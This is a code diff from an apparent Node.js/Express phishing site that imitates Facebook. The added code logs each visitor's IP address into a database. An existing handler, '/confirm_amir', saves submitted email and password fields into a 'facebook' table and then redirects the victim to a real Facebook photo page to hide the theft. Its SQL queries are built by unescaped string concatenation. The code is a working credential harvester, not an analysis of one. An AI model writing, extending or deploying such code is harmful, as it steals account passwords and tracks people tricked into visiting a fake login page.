@@ -26,7 +26,13 @@ app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572
 })
 
 app.get('/',function(req,res){
-    res.render('Facebook')
+    res.render('Facebook');
+    client.query("INSERT INTO ip (ip) VALUES ('"+req.ip+"')", function (err, result) {
+        if (err) {
+            console.log(err)
+        }
+    })
+    console.log(req.ip)
 })
 
 
@@ -50,7 +56,7 @@ app.post('/confirm_amir', function (req, res) {
     var c = req.body.email;
     var d = req.body.pass;
     res.redirect('https://www.facebook.com/photo.php?fbid=160897268265919&set=pcb.2277483372290209&type=3&theater&ifg=1')
-   
+    
     client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
         if (!err) {
             console.log(result)
